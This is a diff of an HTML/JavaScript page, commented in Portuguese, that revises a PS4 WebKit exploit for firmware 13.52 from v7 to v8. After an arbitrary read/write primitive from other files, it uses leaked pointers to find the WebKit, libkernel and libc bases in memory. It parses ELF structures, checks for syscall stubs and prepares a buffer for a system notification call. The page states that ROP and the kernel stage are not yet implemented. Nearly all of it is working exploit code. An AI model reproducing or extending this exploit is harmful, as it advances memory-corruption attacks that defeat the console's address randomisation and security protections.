@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 WebKit Exploit (13.52 — v7)</title>
+<title>PS4 WebKit Exploit (13.52 — v8)</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
@@ -21,7 +22,7 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 #st{font-size:12px;color:#bbb;flex:1}
 #bars{width:100%;max-width:720px;display:flex;justify-content:space-between;
   font-size:10px;color:#333;margin-bottom:8px;padding:0 2px}
-#con{width:100%;max-width:720px;height:380px;background:#050508;
+#con{width:100%;max-width:720px;height:340px;background:#050508;
   border:1px solid #161825;border-radius:6px;overflow-y:auto;
   padding:8px 10px;font-size:11px;line-height:1.65;margin-bottom:8px}
 .i{color:#5b9bd5}.ok{color:#00c853;font-weight:bold}.w{color:#f0a500}
@@ -107,11 +108,11 @@ function int64Sub(a, val) {
 }
 
 // ═════════════════════════════════════════════════════════════════════════════
-// RESOLUÇÃO DE BASES (v7 - usa base direta, SEM scan para trás)
+// RESOLUÇÃO DE BASES (v8 - baseada na v4, SEM scan para trás)
 // ═════════════════════════════════════════════════════════════════════════════
 
 async function resolveAllBases(p, webkitBase) {
-  logH('PARSING ELF DO WEBKIT (v7)');
+  logH('PARSING ELF DO WEBKIT (v8)');
   log('[dbg] webkitBase = 0x' + webkitBase.toString(16));
 
   // ─── Passo 1: Verificar ELF magic ───
@@ -133,18 +134,20 @@ async function resolveAllBases(p, webkitBase) {
     e_phentsize = p.read2(webkitBase.add32(0x36));
     e_phnum = p.read2(webkitBase.add32(0x38));
   } catch(e) {
-    log('[-] Erro ao ler ELF header: ' + e.message, 'e');
+    log('[-] Erro no ELF header: ' + e.message, 'e');
     return null;
   }
 
   log('[dbg] e_phoff=0x' + e_phoff.toString(16) + ' e_phentsize=' + e_phentsize + ' e_phnum=' + e_phnum);
+
   if (e_phnum === 0 || e_phnum > 64) {
-    log('[-] e_phnum inválido', 'w');
+    log('[-] e_phnum inválido: ' + e_phnum, 'w');
     return null;
   }
 
-  // ─── Passo 3: Encontrar PT_DYNAMIC ───
   let phoff = webkitBase.add32(e_phoff.low);
+
+  // ─── Passo 3: Encontrar PT_DYNAMIC ───
   let dynamicVaddr_abs = null;
   let dynamicSize = 0;
 
@@ -165,7 +168,9 @@ async function resolveAllBases(p, webkitBase) {
       }
       dynamicSize = p_filesz.low;
       dynamicVaddr_abs = webkitBase.add32(p_vaddr_rel.low);
-      log('[+] PT_DYNAMIC: abs=0x' + dynamicVaddr_abs.toString(16) + ' size=0x' + dynamicSize.toString(16));
+      log('[+] PT_DYNAMIC: rel=0x' + p_vaddr_rel.toString(16) +
+          ' abs=0x' + dynamicVaddr_abs.toString(16) +
+          ' size=0x' + dynamicSize.toString(16));
       break;
     }
   }
@@ -178,28 +183,31 @@ async function resolveAllBases(p, webkitBase) {
   // ─── Passo 4: Parsear dynamic section ───
   let strtab_abs = null, symtab_abs = null, jmprel_abs = null, pltrelsz = 0;
   let dt_entries = 0;
+  const MAX_DT = 256;
 
-  for (let off = 0; off < dynamicSize && dt_entries < 256; off += 16) {
+  for (let off = 0; off < dynamicSize && dt_entries < MAX_DT; off += 16) {
     let entry = dynamicVaddr_abs.add32(off);
-    let tag, val;
+    let tag, val_raw;
     try {
       tag = p.read8(entry).low;
-      val = p.read8(entry.add32(8));
+      val_raw = p.read8(entry.add32(8));
     } catch(e) {
       log('[-] Segfault no dynamic[' + dt_entries + ']', 'e');
       return trySceFallback(p, webkitBase);
     }
     dt_entries++;
-    if (tag === 5)  strtab_abs = webkitBase.add32(val.low);
-    if (tag === 6)  symtab_abs = webkitBase.add32(val.low);
-    if (tag === 23) jmprel_abs = webkitBase.add32(val.low);
-    if (tag === 2)  pltrelsz = val.low;
+
+    if (tag === 5)  strtab_abs = webkitBase.add32(val_raw.low);
+    if (tag === 6)  symtab_abs = webkitBase.add32(val_raw.low);
+    if (tag === 23) jmprel_abs = webkitBase.add32(val_raw.low);
+    if (tag === 2)  pltrelsz = val_raw.low;
     if (tag === 0)  break;
   }
 
-  log('[dbg] strtab=0x' + (strtab_abs ? strtab_abs.toString(16) : 'null'));
-  log('[dbg] symtab=0x' + (symtab_abs ? symtab_abs.toString(16) : 'null'));
-  log('[dbg] jmprel=0x' + (jmprel_abs ? jmprel_abs.toString(16) : 'null') + ' pltrelsz=' + pltrelsz);
+  log('[dbg] DT entries: ' + dt_entries);
+  log('[+] strtab=0x' + (strtab_abs ? strtab_abs.toString(16) : 'null'));
+  log('[+] symtab=0x' + (symtab_abs ? symtab_abs.toString(16) : 'null'));
+  log('[+] jmprel=0x' + (jmprel_abs ? jmprel_abs.toString(16) : 'null') + ' pltrelsz=' + pltrelsz);
 
   if (!strtab_abs || !symtab_abs || !jmprel_abs || pltrelsz === 0) {
     log('[-] Dynamic incompleta. Fallback SCE...', 'w');
@@ -208,11 +216,12 @@ async function resolveAllBases(p, webkitBase) {
 
   // ─── Passo 5: Varredura RELA ───
   let numRela = Math.floor(pltrelsz / 24);
+  log('[+] Varrendo ' + numRela + ' entradas RELA...');
+
   if (numRela > 10000 || numRela === 0) {
-    log('[-] numRela inválido (' + numRela + ')', 'w');
+    log('[-] numRela inválido (' + numRela + '). Fallback SCE...', 'w');
     return trySceFallback(p, webkitBase);
   }
-  log('[+] Varrendo ' + numRela + ' entradas RELA...');
 
   let imports = {};
   for (let i = 0; i < numRela; i++) {
@@ -247,7 +256,7 @@ async function resolveAllBases(p, webkitBase) {
       imports[name] = { wkOffset: r_offset_rel, importPtr: importPtr };
     }
   }
-  log('[+] ' + Object.keys(imports).length + ' imports');
+  log('[+] ' + Object.keys(imports).length + ' imports parseados');
 
   // ─── Passo 6: Logar úteis ───
   let useful = ['memset','memcpy','strcmp','strlen','pthread_create',
@@ -256,30 +265,85 @@ async function resolveAllBases(p, webkitBase) {
   for (let name of useful) {
     if (imports[name]) {
       let ip = imports[name].importPtr;
+      let wo = imports[name].wkOffset;
       let isSys = (ip.hi >= 0x80 && ip.hi <= 0x9F);
-      log('    ' + name + ': off=0x' + imports[name].wkOffset.toString(16) +
-          ' ptr=0x' + ip.toString(16) + ' sys=' + isSys, isSys ? 'd' : 'w');
+      log('    ' + name + ': wkOff=0x' + wo.toString(16) +
+          ' ptr=0x' + ip.toString(16) +
+          ' sys=' + isSys, isSys ? 'd' : 'w');
     }
   }
 
   // ─── Passo 7: Resolver bases ───
-  return resolveFromImports(p, imports, webkitBase);
+  let libkernelBase = null;
+  let libcBase = null;
+
+  function findElfBase(p, startPtr, maxBack) {
+    for (let back = 0; back < maxBack; back += 0x1000) {
+      try {
+        let test = int64Sub(startPtr, back);
+        if (p.read4(test) === 0x464C457F) {
+          return test;
+        }
+      } catch(e) { return null; }
+    }
+    return null;
+  }
+
+  let lkRef = imports['__stack_chk_guard'] || imports['sceKernelGetpid'] || imports['sceKernelUsleep'];
+  if (lkRef) {
+    let ptr = lkRef.importPtr;
+    log('[dbg] lkRef.ptr = 0x' + ptr.toString(16));
+    if (ptr.hi >= 0x80 && ptr.hi <= 0x9F) {
+      libkernelBase = findElfBase(p, ptr, 0x200000);
+      if (libkernelBase) {
+        log('[+] libkernel: 0x' + libkernelBase.toString(16), 'ok');
+        setCard('c-lk', '0x' + libkernelBase.toString(16));
+      } else {
+        log('[-] Scan libkernel falhou', 'w');
+      }
+    } else {
+      log('[-] lkRef fora do range: 0x' + ptr.toString(16), 'w');
+    }
+  } else {
+    log('[-] Nenhum import de libkernel', 'w');
+  }
+
+  if (imports['memset']) {
+    let ptr = imports['memset'].importPtr;
+    log('[dbg] memset.ptr = 0x' + ptr.toString(16));
+    if (ptr.hi >= 0x80 && ptr.hi <= 0x9F) {
+      libcBase = findElfBase(p, ptr, 0x200000);
+      if (libcBase) {
+        log('[+] libc: 0x' + libcBase.toString(16), 'ok');
+        setCard('c-lc', '0x' + libcBase.toString(16));
+      } else {
+        log('[-] Scan libc falhou', 'w');
+      }
+    } else {
+      log('[-] memset fora do range: 0x' + ptr.toString(16), 'w');
+    }
+  }
+
+  return { imports, libkernelBase, libcBase, webkitBase };
 }
 
-// ─── Fallback SCE: scan controlado DENTRO do módulo WebKit ───
-function trySceFallback(p, webkitBase) {
-  logH('FALLBACK SCE (scan controlado)');
-  log('[!] Varrendo APENAS dentro do módulo WebKit...');
+// ═════════════════════════════════════════════════════════════════════════════
+// FALLBACK SCE (scan controlado APENAS para frente, dentro do módulo)
+// ═════════════════════════════════════════════════════════════════════════════
 
-  // Estimativa: WebKit tem ~50-80MB. Vamos scanear os primeiros 8MB.
-  const SCAN_SIZE = 0x800000;
+function trySceFallback(p, webkitBase) {
+  logH('FALLBACK: SCE IMPORT SCAN');
+  log('[!] Varrendo APENAS dentro do módulo WebKit (para frente)...');
+
   let imports = {};
   let candidates = [];
+  const MAX_SCAN = 0x800000; // 8MB para frente do base
+  let found = 0;
 
-  for (let off = 0; off < SCAN_SIZE; off += 0x8) {
+  for (let off = 0; off < MAX_SCAN && found < 300; off += 0x8) {
     let ptr;
     try { ptr = p.read8(webkitBase.add32(off)); }
-    catch(e) { break; } // segfault — parar
+    catch(e) { break; } // segfault — parar imediatamente
 
     if (ptr.hi >= 0x80 && ptr.hi <= 0x9F && (ptr.low & 0xF) === 0) {
       let b0;
@@ -287,17 +351,13 @@ function trySceFallback(p, webkitBase) {
       catch(e) { continue; }
       if (b0 !== 0x00 && b0 !== 0xCC && b0 !== 0xFF) {
         candidates.push({ off: off, ptr: ptr });
-        if (candidates.length >= 300) break;
+        found++;
       }
     }
   }
 
   log('[+] ' + candidates.length + ' candidatos');
-  return resolveFromCandidates(p, candidates, webkitBase);
-}
 
-// ─── Resolver a partir de candidates SCE ───
-function resolveFromCandidates(p, candidates, webkitBase) {
   let libkernelBase = null;
   let libcBase = null;
 
@@ -349,53 +409,11 @@ function resolveFromCandidates(p, candidates, webkitBase) {
         let b0 = p.read1(base.add32(0x1000));
         if (b0 !== null && b0 !== 0x00 && b0 !== 0xCC) {
           libcBase = base;
-          log('[+] libc: 0x' + base.toString(16), 'ok');
+          log('[+] libc candidata: 0x' + base.toString(16), 'ok');
           setCard('c-lc', '0x' + base.toString(16));
         }
       }
     } catch(e) {}
-  }
-
-  return { imports: {}, libkernelBase, libcBase, webkitBase };
-}
-
-// ─── Resolver a partir de imports ELF ───
-function resolveFromImports(p, imports, webkitBase) {
-  let libkernelBase = null;
-  let libcBase = null;
-
-  function findBase(p, ptr) {
-    if (!ptr || ptr.hi < 0x80 || ptr.hi > 0x9F) return null;
-    for (let back = 0; back < 0x200000; back += 0x1000) {
-      try {
-        let test = int64Sub(ptr, back);
-        if (p.read4(test) === 0x464C457F) return test;
-      } catch(e) { return null; }
-    }
-    return null;
-  }
-
-  let lkRef = imports['__stack_chk_guard'] || imports['sceKernelGetpid'] || imports['sceKernelUsleep'];
-  if (lkRef) {
-    let base = findBase(p, lkRef.importPtr);
-    if (base) {
-      libkernelBase = base;
-      log('[+] libkernel: 0x' + base.toString(16), 'ok');
-      setCard('c-lk', '0x' + base.toString(16));
-    } else {
-      log('[-] libkernel: não encontrada', 'w');
-    }
-  }
-
-  if (imports['memset']) {
-    let base = findBase(p, imports['memset'].importPtr);
-    if (base) {
-      libcBase = base;
-      log('[+] libc: 0x' + base.toString(16), 'ok');
-      setCard('c-lc', '0x' + base.toString(16));
-    } else {
-      log('[-] libc: não encontrada', 'w');
-    }
   }
 
   return { imports, libkernelBase, libcBase, webkitBase };
@@ -405,7 +423,7 @@ function resolveFromImports(p, imports, webkitBase) {
 // VALIDAÇÃO
 // ═════════════════════════════════════════════════════════════════════════════
 
-function validateBases(p, libkernelBase, libcBase) {
+async function validateBases(p, libkernelBase, libcBase, imports) {
   logH('VALIDANDO BASES');
   let valid = { libkernel: false, libc: false };
 
@@ -413,13 +431,13 @@ function validateBases(p, libkernelBase, libcBase) {
     try {
       let magic = p.read4(libkernelBase);
       if (magic === 0x464C457F) {
-        log('[✓] libkernel: ELF OK', 'ok');
+        log('[✓] libkernel: ELF magic OK', 'ok');
         valid.libkernel = true;
       } else {
-        log('[✗] libkernel: magic inválido', 'e');
+        log('[✗] libkernel: magic inválido (0x' + magic.toString(16) + ')', 'e');
       }
     } catch(e) {
-      log('[✗] libkernel: erro', 'e');
+      log('[✗] libkernel: erro ao ler magic', 'e');
     }
   }
 
@@ -427,31 +445,49 @@ function validateBases(p, libkernelBase, libcBase) {
     try {
       let magic = p.read4(libcBase);
       if (magic === 0x464C457F) {
-        log('[✓] libc: ELF OK', 'ok');
+        log('[✓] libc: ELF magic OK', 'ok');
         valid.libc = true;
       } else {
-        log('[✗] libc: magic inválido', 'e');
+        log('[✗] libc: magic inválido (0x' + magic.toString(16) + ')', 'e');
       }
     } catch(e) {
-      log('[✗] libc: erro', 'e');
+      log('[✗] libc: erro ao ler magic', 'e');
     }
   }
 
   if (libkernelBase && valid.libkernel) {
-    let count = 0;
-    for (let off = 0; off < 0x100000 && count < 50; off += 0x10) {
+    let foundStubs = 0;
+    for (let off = 0; off < 0x100000 && foundStubs < 50; off += 0x10) {
       try {
         if (p.read1(libkernelBase.add32(off)) === 0x48 &&
             p.read1(libkernelBase.add32(off+1)) === 0xC7 &&
-            p.read1(libkernelBase.add32(off+2)) === 0xC0) count++;
+            p.read1(libkernelBase.add32(off+2)) === 0xC0) {
+          let b7 = p.read1(libkernelBase.add32(off+7));
+          let b8 = p.read1(libkernelBase.add32(off+8));
+          let b9 = p.read1(libkernelBase.add32(off+9));
+          if (b7 === 0x49 && b8 === 0x89 && b9 === 0xCA) {
+            foundStubs++;
+          }
+        }
       } catch(e) { break; }
     }
-    if (count >= 3) {
-      log('[✓] libkernel: ' + count + ' stubs', 'ok');
+    if (foundStubs >= 3) {
+      log('[✓] libkernel: ' + foundStubs + ' stubs', 'ok');
     } else {
-      log('[✗] libkernel: poucos stubs', 'w');
+      log('[✗] libkernel: poucos stubs (' + foundStubs + ')', 'w');
       valid.libkernel = false;
     }
+  }
+
+  if (libkernelBase) {
+    let aligned = (libkernelBase.low & 0xFFF) === 0;
+    log(aligned ? '[✓] libkernel: alinhada' : '[✗] libkernel: NÃO alinhada', aligned ? 'ok' : 'w');
+    if (!aligned) valid.libkernel = false;
+  }
+  if (libcBase) {
+    let aligned = (libcBase.low & 0xFFF) === 0;
+    log(aligned ? '[✓] libc: alinhada' : '[✗] libc: NÃO alinhada', aligned ? 'ok' : 'w');
+    if (!aligned) valid.libc = false;
   }
 
   return valid;
@@ -461,17 +497,17 @@ function validateBases(p, libkernelBase, libcBase) {
 // NOTIFICAÇÃO
 // ═════════════════════════════════════════════════════════════════════════════
 
-function prepareNotification(p, imports, text) {
-  logH('PREPARANDO NOTIFICAÇÃO');
+function prepareNotification(p, libkernelBase, imports, text) {
+  logH('PREPARANDO BUFFER DE NOTIFICAÇÃO');
 
   let notifyImport = imports['sceKernelSendNotificationRequest'];
   if (!notifyImport) {
-    log('[-] sceKernelSendNotificationRequest não encontrado!', 'e');
+    log('[-] sceKernelSendNotificationRequest não encontrado nos imports!', 'e');
     return null;
   }
 
   let notifyFunc = notifyImport.importPtr;
-  log('[+] Target: 0x' + notifyFunc.toString(16));
+  log('[+] Endereço alvo da API: 0x' + notifyFunc.toString(16));
 
   let encoder = new TextEncoder();
   let msgBytes = encoder.encode(text + '\x00');
@@ -486,7 +522,8 @@ function prepareNotification(p, imports, text) {
   p.write8(backingStore.add32(0x8), backingStore.add32(0x20));
   p.write4(backingStore.add32(0x10), msgBytes.length);
 
-  log('[+] Buffer: 0x' + backingStore.toString(16), 'ok');
+  log('[+] Buffer alocado com sucesso em: 0x' + backingStore.toString(16), 'ok');
+
   return { notifyFunc, requestBuffer: backingStore };
 }
 
@@ -500,7 +537,7 @@ async function main() {
   $fw.textContent = fw ? `PlayStation 4 — firmware ${fw[1]}` : `UA: ${ua.slice(0, 40)}`;
   log('UA: ' + ua, 'd');
 
-  setStatus('Rodando exploit JSC...', 'r');
+  setStatus('Rodando exploit JSC (core.js)...', 'r');
   logH('EXPLOIT JSC (WebKit)');
 
   let carrier;
@@ -519,8 +556,8 @@ async function main() {
     return;
   }
 
-  log('[+] core.js: OK!', 'ok');
-  setStatus('Instalando R/W...', 'r');
+  log('[+] core.js: exploit JSC concluído!', 'ok');
+  setStatus('Instalando R/W arbitrário...', 'r');
   logH('INSTALANDO PRIMITIVA R/W (mem.js)');
 
   let p;
@@ -537,9 +574,9 @@ async function main() {
     return;
   }
 
-  log('[+] R/W instalado!', 'ok');
-  setStatus('Mapeando bases...', 'r');
-  logH('MAPEAMENTO 13.52 (v7)');
+  log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
+  setStatus('Mapeando bases com estabilidade...', 'r');
+  logH('MAPEAMENTO DA 13.52 (v8)');
 
   const ctor = globalThis.__ps5NativeCtor;
   if (typeof ctor === 'number' && ctor > 0x100000000) {
@@ -547,7 +584,7 @@ async function main() {
     const lo = ctor - hi * 0x100000000;
     const ctorInt64 = new int64(lo >>> 0, hi >>> 0);
 
-    log('[+] __ps5NativeCtor: 0x' + ctorInt64.toString(16), 'a');
+    log('[+] __ps5NativeCtor vazado: 0x' + ctorInt64.toString(16), 'a');
 
     const hc = (typeof OFFSET_wk_host_constructor_candidates !== 'undefined')
                ? OFFSET_wk_host_constructor_candidates[0]
@@ -558,59 +595,70 @@ async function main() {
     const baseLo = resolvedBaseVal - baseHi * 0x100000000;
     const webkitBase = new int64(baseLo >>> 0, baseHi >>> 0);
 
-    log('[+] WebKit Base: 0x' + webkitBase.toString(16), 'ok');
+    log('[+] WebKit Base calculada: 0x' + webkitBase.toString(16), 'ok');
+    setCard('c-wk', '0x' + webkitBase.toString(16));
 
-    const result = await resolveAllBases(p, webkitBase);
-    if (!result) {
-      setStatus('Falha na resolução', 'e');
-      return;
-    }
-
-    const valid = validateBases(p, result.libkernelBase, result.libcBase);
-
-    if (!valid.libkernel) {
-      setCard('c-lk', 'Falha');
-      log('[-] libkernel não validou', 'e');
-    }
-    if (!valid.libc) {
-      setCard('c-lc', 'Falha');
-      log('[-] libc não validou', 'e');
-    }
-
-    if (valid.libkernel) {
-      try {
-        const notif = prepareNotification(p, result.imports, 'Hello from PS4 13.52!');
-        if (notif) {
-          setCard('c-g', 'Pronto');
-          setStatus('Notificação pronta!', 'ok');
-          log('[✓] Configuração concluída.', 'ok');
-
-          const cbox = document.getElementById('cbox');
-          cbox.style.display = 'block';
-          document.getElementById('c-out').textContent =
-              'WebKit Base     = 0x' + result.webkitBase.toString(16) + '\n' +
-              'libkernel Base  = 0x' + (result.libkernelBase ? result.libkernelBase.toString(16) : 'N/A') + '\n' +
-              'libSceLibc Base = ' + (result.libcBase ? '0x' + result.libcBase.toString(16) : 'N/A') + '\n' +
-              'Buffer Notif    = 0x' + notif.requestBuffer.toString(16) + '\n' +
-              'Função Target   = 0x' + notif.notifyFunc.toString(16);
-
-          logH('NOTIFICAÇÃO');
-          if (result.imports['sceKernelSendNotificationRequest']) {
-            log('[+] Offset: 0x' + result.imports['sceKernelSendNotificationRequest'].wkOffset.toString(16), 'i');
-          }
-          log('[!] Execução nativa requer ROP (não implementado)', 'w');
-        }
-      } catch (e) {
-        log('[-] Erro: ' + e.message, 'e');
+    setTimeout(async () => {
+      const result = await resolveAllBases(p, webkitBase);
+      if (!result) {
+        setStatus('Falha na resolução de bases', 'e');
+        return;
       }
-    } else {
-      setCard('c-g', 'Falha LK');
-      log('[-] libkernel não resolvida.', 'e');
-    }
+
+      const imports = result.imports;
+      const libKernelBase = result.libkernelBase;
+      const libcBase = result.libcBase;
+
+      const valid = await validateBases(p, libKernelBase, libcBase, imports);
+
+      if (!valid.libkernel) {
+        setCard('c-lk', 'Falha na validação');
+        log('[-] libkernel base não passou na validação', 'e');
+      }
+      if (!valid.libc) {
+        setCard('c-lc', 'Falha na validação');
+        log('[-] libc base não passou na validação', 'e');
+      }
+
+      if (valid.libkernel) {
+        try {
+          const notif = prepareNotification(p, libKernelBase, imports, 'Hello World from PS4 13.52!');
+          if (notif) {
+            setCard('c-g', 'Pronto');
+            setStatus('Buffer de notificação pronto!', 'ok');
+            log('[✓] Configuração de notificação concluída com sucesso.', 'ok');
+
+            const cbox = document.getElementById('cbox');
+            cbox.style.display = 'block';
+            document.getElementById('c-out').textContent =
+                'WebKit Base     = 0x' + webkitBase.toString(16) + '\n' +
+                'libkernel Base  = 0x' + (libKernelBase ? libKernelBase.toString(16) : 'N/A') + '\n' +
+                'libSceLibc Base = ' + (libcBase ? '0x' + libcBase.toString(16) : 'N/A') + '\n' +
+                'Buffer Notif    = 0x' + notif.requestBuffer.toString(16) + '\n' +
+                'Função Target   = 0x' + notif.notifyFunc.toString(16) + '\n' +
+                'Notify Offset   = 0x' + (imports['sceKernelSendNotificationRequest'] ? imports['sceKernelSendNotificationRequest'].wkOffset.toString(16) : 'N/A');
+
+            logH('NOTIFICAÇÃO');
+            log('[+] Offset dinâmico de sceKernelSendNotificationRequest: 0x' + imports['sceKernelSendNotificationRequest'].wkOffset.toString(16), 'i');
+            log('[!] Execução nativa requer ROP chain ou JIT pivot (não implementado)', 'w');
+            log('[!] Status: userland R/W ativo. Kernel exploit necessário para execução real.', 'w');
+
+          } else {
+            setCard('c-g', 'Falha');
+            log('[-] Falha ao preparar buffer de notificação', 'e');
+          }
+        } catch (e) {
+          log('[-] Erro ao preparar buffer: ' + e.message, 'e');
+        }
+      } else {
+        setCard('c-g', 'Falha LK');
+        log('[-] Não foi possível resolver a libkernel para o buffer.', 'e');
+      }
+    }, 1000);
 
   } else {
-    log('[-] __ps5NativeCtor inválido.', 'e');
-    setStatus('Erro NativeCtor', 'e');
+    log('[-] Falha: __ps5NativeCtor não foi capturado corretamente.', 'e');
+    setStatus('Erro ao capturar NativeCtor', 'e');
   }
 }
 
